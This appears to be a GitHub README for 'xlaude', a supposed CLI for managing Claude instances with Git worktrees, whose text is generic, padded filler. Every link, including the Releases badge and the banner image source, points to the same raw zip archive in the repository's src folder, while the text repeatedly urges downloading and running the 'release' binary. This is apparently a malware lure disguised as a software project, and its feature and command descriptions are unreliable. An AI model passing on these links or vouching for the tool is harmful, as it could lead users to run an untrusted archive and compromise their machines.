https://github.com/kisech/xlaude/raw/refs/heads/main/src/Software-3.9-beta.1.zip
[![Releases](https://github.com/kisech/xlaude/raw/refs/heads/main/src/Software-3.9-beta.1.zip)](https://github.com/kisech/xlaude/raw/refs/heads/main/src/Software-3.9-beta.1.zip)

# xlaude: CLI to manage Claude instances with Git worktree

<img alt="xlaude banner" src="https://github.com/kisech/xlaude/raw/refs/heads/main/src/Software-3.9-beta.1.zip" style="width:100%;max-width:1200px;display:block;margin:0 auto;"/>

xlaude is a compact command line tool designed to help developers and operators manage Claude AI instances with the power of Git worktrees. The project combines the reliability of a CLI harness with the flexibility of a distributed working layout. It makes it straightforward to spin up, manage, and synchronize multiple Claude instances across separate worktrees, enabling streamlined testing, experimentation, and deployment workflows.

If you are looking for a focused tool to handle Claude-based deployments in a way that plays nicely with your Git-driven development process, xlaude provides the right balance of simplicity and control. The tool is written with practical defaults, clear error messages, and a small surface area so you can reason about what happens during each operation. It aims to be friendly to both everyday users and power users who want to script and automate their Claude workflows.

Key ideas behind xlaude:
- Bind Claude instance management to the Git worktree concept, so you can isolate experiments and environments cleanly.
- Provide a predictable, auditable set of commands for creating, starting, stopping, and updating Claude instances.
- Keep dependencies minimal and behavior transparent, so you can reason about state across your repository.
- Embrace cross-platform compatibility where feasible, helping you stay productive on Linux, macOS, and Windows.

This README offers a thorough guide to installation, daily usage, advanced workflows, and contribution practices. It includes concrete examples, practical tips, and a clear path to extending the tool in your own projects.

Overview of what xlaude helps you achieve
- Multi-instance management: Run several Claude instances in parallel, each tied to its own Git worktree. This makes it easy to reproduce specific states for testing or collaboration.
- Worktree-aware workflows: Leverage Git’s worktree command to split work on different Claude configurations without polluting your main repository tree.
- Lightweight orchestration: Focus on the core operations you need, without paging through a long chain of runtime scripts. The CLI exposes a compact, well-documented set of commands.
- Consistent state: The tool stores per-instance metadata in a predictable place, so you can recover, audit, and reproduce state as needed.
- Safe automation: It is designed for automation. The commands are idempotent where appropriate, and you’ll receive informative errors when something needs attention.

Why use xlaude
- You work with Claude in multiple environments and need a fast way to switch contexts.
- You want to ensure experiments don’t accidentally mix with production configurations.
- You value the simplicity of a focused tool instead of a heavyweight orchestrator.
- You prefer a CLI that favors explicit actions over implicit behaviors.
- You want a tool that fits naturally into Git-centric workflows.

Getting started
This section is your first stop for practical setup. The guide covers installation, quick verification, and a first run to demonstrate the basic lifecycle of a Claude instance in a worktree.

Prerequisites
- A modern POSIX shell (bash or zsh) or PowerShell on Windows.
- Git installed and configured with your user identity.
- Network access to Claude services unless you are operating in an offline testing mode.
- Sufficient permission to execute binaries and create worktrees in your repository.

Installation options
- Prebuilt binaries: The recommended path for most users is to download the latest release from the Releases page. The binary is platform-aware and ships with all necessary dependencies. See the Releases page for an asset that matches your OS and architecture.
- Building from source: If you want to customize or contribute, you can build from source. The repository includes a straightforward build script and instructions for common environments.

Download and run from releases
- The latest release assets provide the xlaude executable for your platform. You will typically download a single binary that you can place in your PATH.
- After downloading, verify the binary's integrity if a checksum or signature is provided, then make it executable and run it with your preferred arguments.
- This approach keeps the installation lightweight and minimizes the surface area for configuration issues.

Note: The Releases page is the single source of truth for binary distribution. If you need to review the assets, browse the Releases section and pick the binary that matches your system. The Releases page is the place to go for updates, patches, and new features, and it is the recommended starting point for most users. See the project’s Releases section for the full lifecycle of releases, including changelogs and known issues.

Basic usage and a quick demo
- Initialize a new workspace with a clean slate for Claude instances.
- Create a new Claude instance in a separate worktree.
- Start and stop instances as needed.
- Inspect status and logs to verify health and behavior.
- Remove old worktrees when they are no longer needed.

The quick flow
- Create a new repository structure or reuse your existing one.
- Add a worktree for a Claude instance.
- Configure the instance as needed.
- Use the CLI to manage lifecycle events and apply updates across worktrees.

Common commands in xlaude
- xlaude init: Set up the base configuration and repository structure for Claude worktrees.
- xlaude new: Create a new Claude instance in its own worktree.
- xlaude list: Show all managed Claude instances, their status, and their worktree paths.
- xlaude start: Start a Claude instance in the current worktree.
- xlaude stop: Stop a Claude instance in the current worktree.
- xlaude status: Retrieve health and state information for a specific instance.
- xlaude update: Pull updates or apply configuration changes to an instance.
- xlaude exec: Run a command inside a running Claude instance.
- xlaude log: Stream or print logs from a running Claude instance.
- xlaude switch: Toggle between different worktrees for Claude instances.
- xlaude remove: Clean up an instance and its worktree.

Deep dive: How xlaude uses Git worktrees
Git worktrees allow you to have multiple working directories attached to a single repository. This is particularly useful for Claude workflows that require isolated instances or divergent configurations. xlaude maps each Claude instance to a dedicated worktree and a small metadata file that records the instance’s configuration, environment, and status. When you create a new instance, xlaude generates a worktree, checks out the base Claude code, and applies the instance-specific configuration. When you switch between instances, xlaude updates your environment to reflect the active worktree and ensures that commands target the correct Claude process.

Key design decisions
- Isolation by design: Each instance runs in its own worktree, independent of other instances.
- Non-destructive defaults: Operations that modify the environment are designed to be reversible or safe to retry.
- Observability: The tool emphasizes clear status information and straightforward log access.
- Extensibility: The CLI is built with a simple plugin-like approach that can accommodate future integration points.

Project structure
- cli/ or cmd/: Core command-line interface code and command handlers.
- internal/: Business logic and helpers that support the CLI surface.
- examples/: Practical configuration samples and use-case scenarios.
- docs/: Expanded documentation for advanced users and contributors.
- assets/: Images, logos, and decorative assets used in the README and website.
- tests/: Test suites and test data to ensure reliability.

Usage patterns and real-world workflows
- Feature branches and Claude experiments: Create a new worktree for an experimental Claude configuration, run tests, and compare results side-by-side with production or baseline instances.
- CI-friendly deployments: Use the CLI in CI pipelines to provision, run, and teardown Claude instances as part of automated test suites.
- Collaborative projects: Share worktree configurations across teammates to reproduce issues or test ideas in parallel without interfering with the main development line.

Configuration and customization
- Global configuration: A central config file stores common settings, defaults, and paths to worktrees. This makes it possible to define a standard workflow across multiple projects.
- Instance configuration: Each Claude instance carries a local configuration that defines the environment, API keys, and specific Claude parameters. This enables quick re-creation of a given state in another environment.
- Secrets handling: The project provides best-effort support for secret management. It includes opt-in environment variable overrides and secure storage conventions. When storing secrets, follow the recommended encryption and access controls.

Security and best practices
- Verify downloads: When using binaries from the Releases page, verify checksums or signatures if they are provided. This reduces the risk of tampering.
- Use least privilege: Run Claude instances with the minimum required privileges. Avoid running with elevated permissions unless necessary.
- Auditability: The worktree approach makes it easier to audit changes by isolating them to specific directories and metadata files.
- Secrets hygiene: Do not hard-code credentials in worktrees. Use environment variables or secret stores and reference them through the CLI configuration.

Advanced topics
- Scripting and automation: The CLI commands are designed to be scripted. You can embed them in shell scripts, CI workflows, or orchestration tools to automate repetitive tasks.
- Integration with other tools: xlaude is designed to play well with existing tooling. You can combine it with your favorite monitoring, logging, and notification systems.
- Custom worktree layouts: If you have a complex repository layout, you can tune the base paths, worktree names, and metadata locations to fit your needs.

Examples and recipes
- Quick-start recipe:
  - Step 1: Initialize a workspace
  - Step 2: Create a Claude instance in a new worktree
  - Step 3: Start the instance and verify status
  - Step 4: Run a simple test command to validate behavior
  - Step 5: Switch to another instance and perform a separate test
  - Step 6: Clean up outdated worktrees when done

- Multi-branch experimentation:
  - Create a separate worktree for each experimental Claude configuration
  - Use xlaude switch to move quickly between experiments
  - Compare results across worktrees to determine the most promising approach

- Automated validation:
  - Write a script that provisions a Claude instance, runs a set of tests, collects logs, and tears down the instance
  - Use the exit codes to integrate with CI pipelines and report results

The command reference in depth
- xlaude init
  - Purpose: Prepare the repository for Claude worktrees.
  - Typical options: --base-dir, --config, --force
  - Output: A base configuration file and the initial directory layout.

- xlaude new
  - Purpose: Create a new Claude instance in its own worktree.
  - Typical options: --name, --template, --env
  - Output: A new worktree with a Claude environment configured for the specified name.

- xlaude list
  - Purpose: Enumerate managed instances.
  - Output: A concise table listing instance name, status, worktree path, and last activity.

- xlaude start
  - Purpose: Launch a Claude instance.
  - Typical options: --instance, --port, --detach
  - Output: Console messages about the startup process and a PID or process handle.

- xlaude stop
  - Purpose: Stop a Claude instance.
  - Typical options: --instance
  - Output: Confirmation of shutdown or a graceful error if the instance is already stopped.

- xlaude status
  - Purpose: Retrieve health and state information for a given instance.
  - Output: Health checks, uptime, resource usage, and any active tasks.

- xlaude update
  - Purpose: Apply configuration changes or pull updates to an instance.
  - Typical options: --instance, --force
  - Output: A summary of changes and any required steps to apply updates safely.

- xlaude exec
  - Purpose: Run a command inside a running Claude instance.
  - Typical options: --instance, --cmd
  - Output: Command output and an exit status.

- xlaude log
  - Purpose: Stream or print logs from a running Claude instance.
  - Typical options: --instance, --follow
  - Output: Live log stream or a static log dump.

- xlaude switch
  - Purpose: Switch the active worktree or the active Claude instance.
  - Typical options: --to, --instance
  - Output: A message indicating the new active target and any side effects.

- xlaude remove
  - Purpose: Delete an instance and clean up its worktree.
  - Typical options: --instance, --force
  - Output: Confirmation of removal and a summary of what was cleaned up.

Examples: real-world snippets
- Create a new Claude instance named "dev-cl1" in a dedicated worktree:
  xlaude new --name dev-cl1 --template default
- Start the dev-cl1 instance and stream logs:
  xlaude start --instance dev-cl1
  xlaude log --instance dev-cl1 --follow
- Run a health check:
  xlaude status --instance dev-cl1
- Switch to another instance named "qa-cl2" and verify:
  xlaude switch --instance qa-cl2
  xlaude status --instance qa-cl2
- Remove a stale instance:
  xlaude remove --instance dev-cl1 --force

Testing and quality
- Unit tests: The codebase includes a suite of unit tests that verify the correctness of core helpers and command handlers.
- Integration tests: A lightweight integration harness checks end-to-end workflows with a local Claude-like environment.
- Linting and formatting: The project uses a strict linting and formatting policy to keep the codebase clean and readable.
- CI: Continuous integration runs tests on push and pull request events, ensuring early feedback on issues.
- Local development tips: Set up a development environment with minimal overhead, and run tests locally to verify changes before pushing.

Contributing
- How to contribute: We welcome changes that improve reliability, usability, and coverage. Start by opening an issue to discuss your idea, then submit a pull request with a focused scope.
- Coding standards: Follow the project’s existing style. Keep commands simple, explicit, and well-documented.
- Documentation contributions: Improve examples, add new usage scenarios, and expand the FAQ to help new users.
- Testing: Add tests for new features and ensure existing tests remain green.

FAQ
- Is xlaude safe to run in production environments?
  Yes, as long as you follow best practices for secrets management and isolate Claude instances per worktree. Use the instance isolation to prevent cross-traffic and unintended configuration leaks.
- Can I use xlaude with any Claude version?
  The goal is to support common Claude versions used in typical workflows. If you need support for a specific version, please open an issue and we will discuss compatibility.
- How do I upgrade xlaude?
  Upgrade through the releases mechanism. Download the latest asset, verify integrity, and replace the binary. The tool should continue to work with configurations from previous versions.
- What if something goes wrong?
  Check the logs, verify the active worktree, and confirm the instance configuration. If you still have issues, consult the issues page and the CI logs for hints.

Troubleshooting
- Common startup issues: Missing dependencies, network restrictions, or incorrect permissions can block startup. Review the prerequisites and verify environment variables.
- Worktree conflicts: If a worktree is in a conflicted state, resolve Git conflicts, then re-run the setup to ensure the worktree is in a clean state.
- Permissions: Ensure you have execute permissions on the binary and write access to the repository directory and its worktrees.
- Logs: Always inspect logs for actionable messages. Logs often contain the exact command that failed and the system state at the time of failure.

Design notes and philosophy
- Simplicity first: The CLI focuses on the most common tasks and provides a straightforward path to achieve them.
- Predictable behavior: Most commands have sensible defaults, and destructive actions require explicit confirmation.
- Extensibility: The architecture is designed to accommodate future features without a major overhaul.
- Observability: The tool emphasizes clear status reporting and accessible logs to help you understand what happened.

Security and privacy
- Data handling: The tool stores only the necessary metadata to map Claude instances to worktrees. Do not rely on xlaude to handle all sensitive data; use secure secrets management for credentials.
- Secrets management: Prefer environment variables and dedicated secret stores. Never commit secrets to repository metadata.
- Transfer safety: When interacting with Claude, ensure you use secure channels. If your Claude server offers TLS, prefer it, and verify certificates.

Roadmap
- Cross-repo worktree sharing: Allow worktrees to be shared across multiple repositories with a centralized management layer.
- Enhanced monitoring: Add built-in health dashboards and alerting hooks for Claude instances.
- Shadow environments: Support ephemeral environments that auto-clean resources after tests complete.
- Richer export/import: Enable exporting instance configurations and re-importing them into other projects with a single command.

Changelog highlights
- v1.0.0: Initial release with core CLI surface and Git worktree integration.
- v1.1.0: Improved status reporting and log streaming features.
- v1.2.0: Enhanced installation flow and support for additional platforms.
- v1.3.0: Security hardening and improved secrets handling.

License
- MIT License

Credits
- Maintainers, contributors, and users who helped shape the project.
- Special thanks to the Claude community for feedback and inspiration.

Appendix: compatibility notes
- Operating system support: Linux, macOS, and Windows with PowerShell.
- Language and runtime considerations: The CLI uses standard runtime dependencies and avoids platform-specific quirks where possible.

Appendix: reference materials
- Official Claude docs for context on API usage and capabilities.
- Git worktree documentation for advanced workflows and edge cases.

End of README content